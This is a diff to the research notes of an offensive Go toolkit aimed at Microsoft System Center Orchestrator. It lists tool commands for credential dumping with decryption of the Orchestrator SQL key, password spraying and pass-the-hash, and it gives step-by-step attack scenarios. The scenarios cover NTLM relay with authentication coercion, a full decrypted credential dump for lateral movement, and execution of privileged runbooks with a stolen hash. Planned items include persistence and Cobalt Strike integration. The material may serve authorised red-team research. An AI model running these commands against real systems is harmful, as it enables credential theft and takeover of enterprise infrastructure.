@@ -5,7 +5,9 @@
 
 ## Executive Summary
 
-System Center Orchestrator (SCORCH) is a workflow management solution in the Microsoft System Center suite. It provides automation capabilities across enterprise environments, connecting to AD, SCOM, SCCM, VMM, Exchange, and more through Integration Packs. This makes it a **high-value credential store** with **zero existing offensive tooling**.
+System Center Orchestrator (SCORCH) is a workflow management solution in the Microsoft System Center suite. It provides automation capabilities across enterprise environments, connecting to AD, SCOM, SCCM, VMM, Exchange, and more through Integration Packs. This makes it a **high-value credential store**.
+
+**Tool:** [scorch v2.0.1](https://github.com/professor-moody/scorch) - Go-based offensive toolkit for SCORCH.
 
 **Key Attack Value:**
 - Stores credentials for numerous enterprise systems (AD, VMM, SCOM, SCCM, Exchange, Azure)
@@ -392,100 +394,106 @@ SELECT * FROM sys.asymmetric_keys WHERE name = 'ORCHESTRATOR_ASYM_KEY'
 
 ## Go Toolkit Architecture
 
-### Proposed Structure
+### Current Structure (v2.0.1)
 
 ```
-scorch-tools/
-├── cmd/
-│   ├── scorch-enum/           # Remote enumeration via API
-│   │   └── main.go
-│   ├── scorch-dump/           # Local credential extraction
-│   │   └── main.go
-│   └── scorch-inject/         # Runbook injection/execution
-│       └── main.go
-├── pkg/
-│   ├── api/
-│   │   ├── client.go          # HTTP client with auth
-│   │   ├── odata.go           # Legacy OData parser
-│   │   ├── json.go            # Modern JSON API
-│   │   ├── runbooks.go        # Runbook operations
-│   │   ├── jobs.go            # Job operations
-│   │   └── types.go           # Data structures
-│   ├── db/
-│   │   ├── connection.go      # SQL Server connection
-│   │   ├── decrypt.go         # ORCHESTRATOR_SYM_KEY decryption
-│   │   ├── variables.go       # Variable extraction
-│   │   ├── credentials.go     # Credential harvesting
-│   │   └── schema.go          # Database schema helpers
-│   ├── local/
-│   │   ├── settings.go        # Settings.dat parser
-│   │   ├── webconfig.go       # Web.config extraction
-│   │   ├── dpapi.go           # DPAPI decryption (Windows)
-│   │   └── registry.go        # Registry enumeration
-│   └── discovery/
-│       ├── network.go         # Port scanning
-│       ├── ldap.go            # AD enumeration
-│       └── spn.go             # SPN discovery
+scorch/
+├── cmd/scorch/
+│   ├── main.go           # Entry point, command routing, flag parsing
+│   ├── assess.go         # Security assessment (anon access, NTLM, TLS)
+│   ├── enum.go           # API enumeration (runbooks, servers, folders)
+│   ├── exec.go           # Runbook execution with parameters
+│   ├── dump.go           # SQL credential extraction (with IP filtering)
+│   ├── spray.go          # Password spraying against web service
+│   ├── discover.go       # Port scanning, LDAP, SPN discovery
+│   ├── client.go         # HTTP client with auth wrappers
+│   └── ntlm.go           # Cross-platform NTLM implementation
 ├── internal/
-│   ├── auth/
-│   │   ├── ntlm.go            # NTLM authentication
-│   │   ├── kerberos.go        # Kerberos authentication
-│   │   └── negotiate.go       # SPNEGO handling
-│   └── crypto/
-│       ├── mssql.go           # SQL Server encryption
-│       └── dpapi_windows.go   # Windows DPAPI calls
+│   └── auth/
+│       └── kerberos.go   # Kerberos authentication (gokrb5)
+├── dist/                 # Compiled binaries (Windows/Linux x64/ARM)
 ├── go.mod
 ├── go.sum
-└── README.md
+├── README.md
+└── research.md           # This file
 ```
+
+### Implemented Commands
+
+| Command | Description | Key Features |
+|---------|-------------|--------------|
+| `assess` | Security assessment | Anonymous access, NTLM relay detection, TLS analysis |
+| `enum` | API enumeration | Runbooks, servers, folders, jobs, leak scanning |
+| `exec` | Runbook execution | Parameter passing, job monitoring, wait mode |
+| `dump` | Credential extraction | SQL decryption, IP filtering (`-ip SCOM`), masking |
+| `spray` | Password spraying | User/password lists, concurrency, result logging |
+| `discover` | Network discovery | Port scan, LDAP enumeration, SPN discovery |
+
+### Authentication Support
+
+| Method | Flag | Implementation |
+|--------|------|----------------|
+| Anonymous | (none) | No auth headers |
+| Basic Auth | `-u`, `-p` | HTTP Basic |
+| NTLM | `-d`, `-u`, `-p` | Cross-platform go-ntlmssp |
+| Pass-the-Hash | `-d`, `-u`, `-H` | NTLM with hash |
+| Kerberos (password) | `-kerberos`, `-u`, `-p` | gokrb5 |
+| Kerberos (ccache) | `-kerberos`, `-ccache` | Ticket cache |
+| Kerberos (keytab) | `-kerberos`, `-keytab` | Service keytab |
 
 ### Core Dependencies
 
 ```go
-// go.mod
-module github.com/user/scorch-tools
+// go.mod (current)
+module scorch-tools
 
 go 1.21
 
 require (
-    github.com/denisenkom/go-mssqldb v0.12.3  // SQL Server driver
-    github.com/jcmturner/gokrb5/v8 v8.4.4     // Kerberos auth
-    github.com/go-ldap/ldap/v3 v3.4.6         // LDAP queries
-    github.com/billgraziano/dpapi v0.4.0      // DPAPI (Windows)
-    golang.org/x/sys v0.15.0                  // Windows syscalls
+    github.com/microsoft/go-mssqldb v1.7.2   // SQL Server driver (migrated from denisenkom)
+    github.com/jcmturner/gokrb5/v8 v8.4.4    // Kerberos auth
+    github.com/go-ldap/ldap/v3 v3.4.6        // LDAP queries
+    golang.org/x/crypto v0.17.0              // Cryptographic functions
 )
 ```
 
 ---
 
-## Implementation Priority
+## Implementation Status
 
-### Phase 1: Remote Enumeration (scorch-enum)
-1. API client with NTLM/Kerberos auth
-2. Runbook enumeration
-3. Integration Pack connection discovery
-4. Runbook server enumeration
-5. Job history analysis
+### ✅ Completed (v2.0.1)
 
-### Phase 2: Local Extraction (scorch-dump)
-1. Settings.dat DPAPI decryption
-2. Web.config extraction
-3. SQL database credential extraction
-4. ORCHESTRATOR_SYM_KEY decryption routine
-5. Variable and connection credential dump
+| Feature | Command | Status |
+|---------|---------|--------|
+| API client with NTLM/Kerberos auth | All | ✅ Complete |
+| Runbook enumeration | `enum` | ✅ Complete |
+| Runbook server enumeration | `enum` | ✅ Complete |
+| Job history analysis | `enum` | ✅ Complete |
+| SQL database credential extraction | `dump` | ✅ Complete |
+| ORCHESTRATOR_SYM_KEY decryption | `dump` | ✅ Complete |
+| Integration Pack filtering | `dump` | ✅ Complete (`-ip-summary`, `-ip TYPE`) |
+| Port scanning | `discover` | ✅ Complete |
+| LDAP/SPN discovery | `discover` | ✅ Complete |
+| Security assessment | `assess` | ✅ Complete |
+| Password spraying | `spray` | ✅ Complete |
+| Runbook execution | `exec` | ✅ Complete |
 
-### Phase 3: Remote Exploitation (scorch-inject)
-1. Runbook creation via API
-2. Malicious runbook templates
-3. Job execution and monitoring
-4. Output retrieval
+### 🔄 In Progress (dev branch)
 
-### Phase 4: BOF Implementation
-1. In-memory credential extraction
-2. Cobalt Strike integration
-3. Minimal footprint operations
+| Feature | Priority | Notes |
+|---------|----------|-------|
+| Enhanced LDAP filters | P2 | gMSA, naming conventions |
+| OIS export file parser | P1 | Offline encrypted variable extraction |
 
----
+### 📋 Planned
+
+| Feature | Priority | Notes |
+|---------|----------|-------|
+| Local triage command | P1 | Registry, services, config files (Windows) |
+| DPAPI decryption | P3 | Settings.dat, local credential cache |
+| Runbook modification via SQL | P3 | Persistence mechanism |
+| SCOM credential extraction | P4 | Leverage SCORCH→SCOM connections |
+| BOF implementations | P4 | Cobalt Strike integration |
 
 ---
 
@@ -571,41 +579,50 @@ TRUNCATE TABLE [Microsoft.SystemCenter.Orchestrator.Internal].AuthorizationCache
 
 ```bash
 # 1. Check for anonymous access
-scorch assess -server scorch.corp.local -full
+scorch assess -t scorch.corp.local
 
 # 2. If anonymous access found, enumerate runbooks
-scorch enum -server scorch.corp.local -all -json
+scorch enum -t scorch.corp.local -all -json
 
 # 3. Search for credential-handling runbooks
-scorch enum -server scorch.corp.local -cred-search
+scorch enum -t scorch.corp.local -leaks
 
 # 4. Analyze runbook parameters for credential inputs
-scorch enum -server scorch.corp.local -runbook-id <guid> -params
+scorch enum -t scorch.corp.local -runbooks -json
 ```
 
 ### Scenario 2: Domain User → SCORCH Admin via NTLM Relay
 
 ```bash
-# 1. Set up NTLM relay to SCORCH (if EPA disabled)
+# 1. Assess for NTLM relay vulnerability
+scorch assess -t scorch.corp.local
+
+# 2. Set up NTLM relay to SCORCH (if EPA disabled)
 ntlmrelayx.py -t http://scorch.corp.local:81/Orchestrator2012/Orchestrator.svc/Runbooks
 
-# 2. Coerce authentication from high-privilege user
+# 3. Coerce authentication from high-privilege user
 # (SpoolSample, PetitPotam, etc.)
 
-# 3. Relay creates authenticated session
-# 4. Execute malicious runbook or extract credentials
+# 4. Relay creates authenticated session
+# 5. Execute malicious runbook or extract credentials
 ```
 
 ### Scenario 3: SQL Access → Full Credential Dump
 
 ```bash
 # 1. Connect to SQL Server (compromised SA or trusted auth)
-scorch dump -server sqlserver.corp.local -database Orchestrator -info
+scorch dump -t sqlserver.corp.local -db Orchestrator -info
 
-# 2. Extract and decrypt all credentials
-scorch dump -server sqlserver.corp.local -database Orchestrator -all -decrypt -sensitive
+# 2. Get Integration Pack summary
+scorch dump -t sqlserver.corp.local -ip-summary
 
-# 3. Use extracted credentials for lateral movement
+# 3. Extract and decrypt all credentials
+scorch dump -t sqlserver.corp.local -all -decrypt -sensitive
+
+# 4. Extract specific IP type (e.g., SCOM connections)
+scorch dump -t sqlserver.corp.local -ip SCOM -decrypt -sensitive
+
+# 5. Use extracted credentials for lateral movement
 # SCOM admin → SCOM infrastructure
 # VMM admin → Hypervisor infrastructure
 # SCCM admin → Endpoint management
@@ -618,13 +635,13 @@ scorch dump -server sqlserver.corp.local -database Orchestrator -all -decrypt -s
 # (Mimikatz, secretsdump, etc.)
 
 # 2. Use hash to authenticate to SCORCH API
-scorch enum -server scorch.corp.local -domain CORP -username admin \
-    -nthash aad3b435b51404eeaad3b435b51404ee -all
+scorch enum -t scorch.corp.local -d CORP -u admin \
+    -H aad3b435b51404eeaad3b435b51404ee -all
 
 # 3. Execute privileged runbooks
-scorch exec -server scorch.corp.local -domain CORP -username admin \
-    -nthash aad3b435b51404eeaad3b435b51404ee \
-    -runbook-id <guid> -param "Target=dc01.corp.local" -wait
+scorch exec -t scorch.corp.local -d CORP -u admin \
+    -H aad3b435b51404eeaad3b435b51404ee \
+    -runbook <name-or-guid> -wait
 ```
 
 ### Scenario 5: Malicious Runbook Injection
@@ -705,7 +722,7 @@ WHERE qt.text LIKE '%ORCHESTRATOR_SYM_KEY%'
 - Microsoft SCORCH Documentation: https://learn.microsoft.com/en-us/system-center/orchestrator/
 - SCORCH API Community Module: https://github.com/WillyMoselhy/SystemCenterOrchestrator
 - System Center 2025 Overview: https://learn.microsoft.com/en-us/system-center/orchestrator/learn-about-orchestrator
-- SpecterOps NTLM Relay: https://posts.specterops.io/the-renaissance-of-ntlm-relay-attacks-everything-you-need-to-know
+- SpecterOps SCOM Research: https://specterops.io/blog/2025/12/10/scommand-and-conquer-attacking-system-center-operations-manager-part-1/
 - MITRE ATT&CK T1557: https://attack.mitre.org/techniques/T1557/
 - KB5005413 NTLM Relay Mitigations: https://support.microsoft.com/en-us/topic/kb5005413-mitigating-ntlm-relay-attacks
 
